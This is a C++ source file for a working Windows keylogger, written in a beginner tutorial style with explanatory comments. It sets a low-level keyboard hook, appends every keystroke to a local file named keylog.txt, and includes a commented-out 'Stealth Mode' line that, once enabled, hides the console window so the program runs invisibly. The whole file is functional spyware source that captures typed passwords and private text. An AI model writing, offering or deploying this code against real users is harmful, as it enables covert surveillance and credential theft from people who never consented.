#include <iostream>
#include <windows.h>
#include <fstream>

// This variable will hold our "Hook"
HHOOK hHook;

// This function runs every time a key is pressed
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    
    // nCode >= 0 means there is a keystroke to process
    // wParam == WM_KEYDOWN means the key was just pressed down
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        
        // kbdStruct contains the details of the key
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        
        // 1. Open the file in "Append" mode
        std::ofstream logfile;
        logfile.open("keylog.txt", std::ios::app);

        // 2. Filter specific keys (Optional: make output readable)
        if (kbdStruct->vkCode == VK_RETURN) {
            logfile << "\n";
        }
        else if (kbdStruct->vkCode == VK_SPACE) {
            logfile << " ";
        }
        else if (kbdStruct->vkCode == VK_BACK) {
            logfile << "[BACKSPACE]";
        }
        // 3. Log normal characters
        else {
            logfile << (char)kbdStruct->vkCode;
        }

        logfile.close();
    }

    // IMPORTANT: Pass the key to the next program so we don't "freeze" the keyboard
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int main() {
    // 1. Hide the Console Window (Stealth Mode)
    // Uncomment the next line to make the program invisible!
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::cout << "Keylogger started... (Check keylog.txt)" << std::endl;

    // 2. Set the Hook
    // WH_KEYBOARD_LL = Low Level Keyboard Hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (hHook == NULL) {
        std::cout << "Failed to install hook!" << std::endl;
        return 1;
    }

    // 3. Message Loop
    // Windows programs need a loop to stay alive and listen for messages
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 4. Cleanup (Unhook)
    UnhookWindowsHookEx(hHook);
    return 0;
}